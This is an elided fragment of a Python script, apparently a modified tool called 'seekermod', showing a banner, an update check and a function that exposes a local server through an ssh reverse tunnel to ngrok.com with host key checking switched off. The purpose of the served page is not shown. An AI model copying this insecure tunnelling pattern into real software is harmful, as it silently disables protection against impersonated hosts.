...
/____  > \___  >\___  >|__|_ \ \___  >|__|
	 \/      \/     \/      \/     \/        ''' + W)
	print('\n' + G + '[>]' + C + ' Mod By : ' + W + 'Rajtechhub')
	print(G + '[>]' + C + ' Version    : ' + W + version + '\n')

def ver_check():
	print(G + '[+]' + C + ' Checking for Updates.....', end='')
	ver_url = 'https://github.com/Rajtechhub/seekermod/version.txt'
	try:
...
def tunnel_select():
	if tunnel_mode == None:
		...
		print(G + '[+]' + C + ' Skipping ngrok, start your own tunnel service manually...' + W + '\n')
	else:
...
def ngrok():
	...
	if subdom is None:
		with open('logs/ngrok.txt', 'w') as tmpfile:
			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '80:localhost:{}'.format(port), 'ngrok.com'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
	else:
		with open('logs/ngrok.txt', 'w') as tmpfile:
			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '{}.ngrok.com:80:localhost:{}'.format(subdom, port), 'ngrok.com'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
	
	while True:
		with open('logs/ngrok.txt', 'r') as tmpfile:
			try:
